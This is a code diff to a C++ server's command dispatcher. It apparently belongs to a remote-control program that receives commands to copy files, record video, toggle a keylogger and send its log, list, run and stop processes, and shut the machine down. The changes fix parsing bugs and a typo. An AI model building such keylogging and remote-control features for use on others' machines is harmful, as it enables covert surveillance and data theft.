@@ -83,10 +83,12 @@ void Server::ProcessCommand()
 {
     std::stringstream ss(command);
     std::string com, body;
-    ss >> com >> body;
+    ss >> com;
+    std::getline(ss, body);
+    if(!body.empty())body=body.substr(1);
     if (com == "COPYFILE")
     {
-        std::string destPath=CopyToPath(body);
+        std::string destPath = CopyToPath(body);
         SendResult(destPath);
         DeleteFilePath(body);
         DeleteFilePath(destPath);
@@ -108,7 +110,8 @@ void Server::ProcessCommand()
         {
             stopRecording();
         }
-        if(!videoFilePath.empty())SendResult(videoFilePath);
+        if (!videoFilePath.empty())
+            SendResult(videoFilePath);
     }
     else if (com == "TOGGLE_KEYLOGGER")
     {
@@ -130,25 +133,27 @@ void Server::ProcessCommand()
                 path_to_send = keylog.path;
                 keylog.path = "";
             }
-        } 
+        }
         if (!path_to_send.empty())
         {
             SendResult(path_to_send);
         }
     }
-    else if (com == "GET_RUNNING_PROCESSS")
+    else if (com == "GET_RUNNING_PROCESS")
     {
-        // Handle GET_RUNNING_PROCESSS
+       listProcesses();
+       SendResult("../data/process/running_process.txt");
     }
     else if (com == "RUN_PROCESS")
     {
         std::wstring name(body.begin(), body.end());
+        name = L"\"" + name + L"\"";
         startProcess(name);
     }
     else if (com == "SHUTDOWN_PROCESS")
     {
         std::wstring name(body.begin(), body.end());
-        startProcess(name);
+        stopProcess(name);
     }
     else if (com == "SLEEP")
     {
@@ -162,9 +167,9 @@ void Server::ProcessCommand()
     {
         ShutDown();
     }
-    for(int i=0;i<BUFSIZ;i++)
+    for (int i = 0; i < BUFSIZ; i++)
     {
-        command[i]='\0';
+        command[i] = '\0';
     }
 }
 
